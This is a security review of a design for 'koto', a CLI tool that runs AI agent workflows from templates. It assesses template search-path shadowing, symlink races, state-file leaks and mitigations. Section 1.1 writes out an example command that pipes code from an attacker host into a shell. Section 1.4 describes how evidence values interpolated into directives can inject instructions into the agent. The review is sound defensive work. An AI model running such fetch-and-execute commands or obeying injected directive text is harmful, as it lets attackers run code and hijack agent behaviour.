# Security Review: DESIGN-koto-cli-tooling.md

## Review Scope

Security analysis of the CLI and template tooling design document (`docs/designs/DESIGN-koto-cli-tooling.md`). This review covers the design's stated security considerations, examines attack vectors introduced by the proposed changes, evaluates mitigations, and identifies residual risk.

The review is grounded in the actual codebase: engine implementation (`pkg/engine/engine.go`), template compiler (`pkg/template/compile/compile.go`), compiled template types (`pkg/template/compiled.go`), controller (`pkg/controller/controller.go`), and CLI (`cmd/koto/main.go`).

## Question 1: Attack Vectors Not Considered

### 1.1 Template Search Path Poisoning (MEDIUM)

The design introduces a three-level search path: explicit path, project-local (`./templates/`, `./.koto/templates/`), and user-global (`~/.koto/templates/`). The security section mentions "malicious template in search path" but doesn't address the primary way this happens.

**Attack scenario:** A user clones a repository that ships a `templates/quick-task.md` containing command gates that run `curl https://evil.com/exfil | sh`. The user runs `koto init --template quick-task` thinking they'll get their personal `~/.koto/templates/quick-task.md`, but the project-local template wins because it has higher precedence.

This is a legitimate concern the design acknowledges but underestimates. The "same trust model as Makefiles" comparison in the upstream design holds for templates already in the repo when you clone it. But the search path creates a new vector: **name squatting**. A malicious repo author can ship templates whose names match commonly-used global templates, knowing the local copy takes precedence. Unlike Makefiles, where users explicitly run `make <target>`, here the user types a template _name_ expecting resolution to a known location.

**Why this matters more than Makefiles:** When you run `make`, you know you're running the Makefile in the current directory. When you run `koto init --template quick-task`, the mental model is "use my quick-task template" -- users may not realize the project has shadowed their global template.

### 1.2 State File template_path as an Oracle (LOW)

The state file stores `template_path` as an absolute path (visible in `cmd/koto/main.go` line 128: `filepath.Abs(templatePath)`). Every subsequent command (`transition`, `next`, `validate`, `rewind`) re-reads the template from this stored path (`loadTemplateFromState()`). The state file is JSON on disk with default permissions.

**Attack scenario:** An attacker who can read the state file learns the absolute filesystem path of the template, which reveals the user's home directory structure and project layout. In multi-tenant or shared environments, this leaks information about other users' filesystem organization.

The design doesn't mention this. It's low severity for the typical single-user developer workstation case, but worth documenting.

### 1.3 Symlink Race in Template Resolution (LOW)

The design mentions "Symlink in template directory" as a risk with the mitigation being "Go's os.ReadFile follows symlinks." But the actual risk is more specific. When `koto init` resolves a template by name, it stats the search path directories, finds a file, then reads it. Between the stat and the read, the file could be replaced with a symlink pointing elsewhere (classic TOCTOU).

The engine already handles symlink checking for _state files_ (`atomicWrite` in `engine.go` line 501: checks `os.Lstat` for symlinks before rename). But the design adds no equivalent protection for template reads. Since template reads are read-only (no writes), the practical risk is limited to reading unexpected content, which is already covered by the command gate review argument.

### 1.4 Evidence Value Injection Into Directive Interpolation (MEDIUM)

The design adds `--evidence key=value` to the CLI. The upstream design (and the controller implementation at `controller.go` lines 77-81) shows that evidence values are merged into the interpolation context and used for `{{KEY}}` replacement in directive text. The namespace collision check prevents evidence from shadowing _declared_ variables, but evidence keys that match _undeclared_ placeholders in directives will still be interpolated.

**Attack scenario (requires coordinated access):** A template has directive text containing `{{NOTES}}` as a placeholder expecting agent-provided evidence. An attacker who can invoke `koto transition --evidence NOTES="<malicious instructions>"` can rewrite the directive the agent sees. Since koto manages AI agent workflows, altering the directive text changes what the agent does next.

This is acknowledged in the upstream design's mitigation table as "Undeclared variable names remain open" with no mitigation. The CLI design doesn't revisit this. For the self-contained CLI case (user runs koto locally, controls both the template and the evidence), this is low risk. But when koto is integrated into automated pipelines where evidence comes from external sources (CI, webhooks, other tools), this becomes a prompt injection vector for the AI agent.

The design should note this as a known risk that becomes relevant when evidence sources are not fully trusted.

### 1.5 Unbounded State File Growth (LOW)

Each transition appends a `HistoryEntry` (including evidence) to the state file. The `--evidence` flag makes it easy to supply large values. There's no size limit on evidence values or total state file size.

**Scenario:** `koto transition done --evidence report="$(cat /dev/urandom | base64 | head -c 100000000)"` writes a ~100MB evidence value into the state file. Subsequent operations that `json.Unmarshal` the full state file consume proportional memory.

This is a nuisance-level DoS, not a security breach. But since the user controls evidence values and may be an AI agent that generates large outputs, some bound on evidence value size would be reasonable.

### 1.6 No Validation of Template Source During `koto template list` (LOW)

`koto template list` scans directories and reads YAML frontmatter from every `.md` file found. If a directory in the search path contains a crafted file that exploits a go-yaml parsing vulnerability, merely listing templates triggers the vulnerability. The design says `list` "reads YAML frontmatter from each .md file" but doesn't note that this is an active parsing operation on potentially untrusted content.

The upstream design confines go-yaml to the compiler, not the engine. But `template list` extends go-yaml parsing to a discovery operation that scans multiple directories, including project-local templates from untrusted repos.

## Question 2: Are Mitigations Sufficient?

### 2.1 "koto template inspect shows gates before init" -- Insufficient

The design lists this as the mitigation for malicious templates in the search path. This is a manual process that depends on the user remembering to inspect before init. No warning is shown if a local template shadows a global one. No prompt asks "Did you mean the template at ~/.koto/templates/quick-task.md?"

**Assessment: Insufficient as a standalone mitigation.** Adding a warning when a project-local template shadows a user-global template of the same name would materially reduce this risk with minimal UX impact. Something like: `note: using ./templates/quick-task.md (shadows ~/.koto/templates/quick-task.md)`.

### 2.2 SHA-256 Hash Verification -- Sufficient for its scope

The hash is computed at init time and checked on every subsequent operation. Template modification after init is detected. This is well-implemented in the engine (the `persist` function includes version conflict checking).

**Assessment: Sufficient.** The residual risk (hash collision) is negligible. The hash protects against post-init modification but doesn't help with the initial trust decision (which templates to init with).

### 2.3 "No variable interpolation in command strings" -- Sufficient and verified

The upstream design specifies this as a security boundary with explicit tests. The engine implementation (`evaluateCommandGate` in `engine.go` line 616) passes `gate.Command` directly to `sh -c` with no interpolation call. The compiler doesn't interpolate command strings either. The controller only interpolates directive text, not gate commands.

**Assessment: Sufficient.** The boundary is clean and enforced at multiple layers.

### 2.4 State File Permissions (0644) -- Insufficient for sensitive evidence

The design notes "Evidence containing sensitive data / State file permissions default to 0644 / Sensitive evidence visible in state file." This is documented but not mitigated. The state directory is created with 0750 (`cmd/koto/main.go` line 151: `os.MkdirAll(stateDir, 0o750)`), but the state file itself is created via `os.CreateTemp` which typically creates files with 0600, then `os.Rename` preserves those permissions. So the actual file permissions are likely 0600, not 0644 as stated.

**Assessment: The design document states 0644 but the implementation creates files with 0600 via CreateTemp. This discrepancy should be corrected in the document.** The actual behavior (0600) is the more secure option. If evidence may contain secrets (API keys, tokens), 0600 is appropriate. The design should explicitly state the intended permission model.

### 2.5 Command Gate Timeout -- Sufficient

Default 30s timeout, configurable per gate, process group kill on timeout. The implementation uses `Setpgid: true` and `syscall.Kill(-pid, SIGKILL)` to clean up child processes. This is well done.

**Assessment: Sufficient.**

## Question 3: Residual Risk to Escalate

### 3.1 ESCALATE: Evidence as Prompt Injection Vector

When koto manages AI agent workflows, evidence values become part of the agent's instructions through directive interpolation. The CLI design adds `--evidence` without any sanitization, validation, or opt-in mechanism to mark evidence keys as "safe for interpolation."

Today this is a single-user tool where the user controls both templates and evidence. But the design should document that:
- Evidence injected into directives can alter agent behavior
- Future integrations where evidence comes from external sources (CI, APIs, other agents) must treat evidence as untrusted input
- Template authors who use `{{KEY}}` placeholders for evidence-driven directives should be aware that evidence values are user-supplied strings with no sanitization

**Recommendation:** Add a forward-looking note in the security section about the evidence-as-prompt-injection risk. No code changes needed now, but this should be on the radar for when koto is used in multi-agent or pipeline contexts.

### 3.2 ESCALATE: Search Path Shadowing Without Warning

The search path's first-match-wins behavior with no warning on shadow is a usability issue with security implications. A user who expects their global template but gets a project-local one may unknowingly run command gates they haven't reviewed.

**Recommendation:** Add a shadow warning to the design. When `koto init` resolves a template by name (not explicit path) and finds a match at a higher-precedence location while a match also exists at a lower-precedence location, print a warning to stderr: `note: using <path> (shadows <other-path>)`.

This is low implementation cost and meaningfully reduces the chance of accidentally running an unreviewed template.

## Question 4: "Not Applicable" Justifications

### 4.1 "Download Verification: Not applicable" -- Correct

The design doesn't download templates. Templates are local files. The search path looks only at local directories. No network requests. This is correctly identified as not applicable.

**Assessment: Correctly N/A.**

### 4.2 "Supply Chain Risks: Templates are local files, not downloaded packages" -- Mostly correct, with a nuance

The design says "the trust model matches Makefiles: the project owner defines templates, users review them before use." This is accurate for the file-based model. However, the search path introduces a wrinkle: project-local templates are loaded from a cloned repository, which is a supply chain vector. When you clone a repo and run `koto init --template <name>`, you're trusting the repo's templates directory.

This is the same trust model as Makefiles (you run `make` in a cloned repo), but the search path makes it less visible than Makefiles because the template is resolved by name, not by explicit file path. The user might not realize they're using a project-specific template.

**Assessment: N/A justification is too strong. Should be "Low risk, same trust model as Makefiles, with the caveat that name-based resolution makes the trust decision less visible."** The mitigation (shadow warning) addresses this.

### 4.3 "Execution Isolation: Template compilation doesn't execute any code" -- Correct for this design

The design correctly notes that compilation only parses YAML and extracts markdown. Command gates execute during transitions (the engine's responsibility, already implemented). The new `--evidence` flag passes data, doesn't execute commands.

**Assessment: Correctly scoped.** The design doesn't introduce new execution vectors. The existing command gate execution is already designed and implemented with appropriate controls (no interpolation, timeout, process group cleanup).

## Summary of Findings

| # | Finding | Severity | Action |
|---|---------|----------|--------|
| 1 | Search path shadowing enables name-squatting attacks | Medium | Add shadow warning to stderr when local template shadows global |
| 2 | Evidence interpolation into directives is a prompt injection vector | Medium | Document as forward-looking risk; no code changes now |
| 3 | State file `template_path` leaks filesystem layout | Low | Document in security section |
| 4 | Design states 0644 permissions but implementation uses 0600 | Low | Fix the document to match implementation |
| 5 | `koto template list` extends go-yaml parsing to discovery of untrusted dirs | Low | Document; acceptable given go-yaml's maturity |
| 6 | Unbounded evidence value size | Low | Consider size limits in future; not blocking |
| 7 | "Supply chain risks: N/A" is slightly overstated | Info | Reword to acknowledge search path nuance |
| 8 | `koto template inspect` alone is insufficient mitigation | Info | Pair with shadow warning for meaningful protection |

## Recommendations

1. **Add shadow warning (Finding 1).** When resolving a template by name, if a higher-precedence match shadows a lower-precedence one, print to stderr: `note: using <local-path> (shadows <global-path>)`. This is the single highest-value security improvement for the design.

2. **Document the evidence-as-prompt-injection risk (Finding 2).** Add a note to the security section: evidence values are interpolated into agent directives. When evidence comes from untrusted sources, this is a prompt injection vector. Template authors should be aware.

3. **Fix the permissions documentation (Finding 4).** The design says 0644, but `os.CreateTemp` creates files with 0600. State the intended permissions explicitly and ensure the implementation matches.

4. **Soften the supply chain N/A (Finding 7).** Reword from "Not applicable" to a brief acknowledgment that project-local templates from cloned repos are a trust surface, mitigated by the same review-before-use model as Makefiles.

None of these findings block the design. The design's security posture is solid for a single-user local CLI tool. The findings primarily address edge cases that become relevant as koto adoption grows and templates are shared across projects and teams.
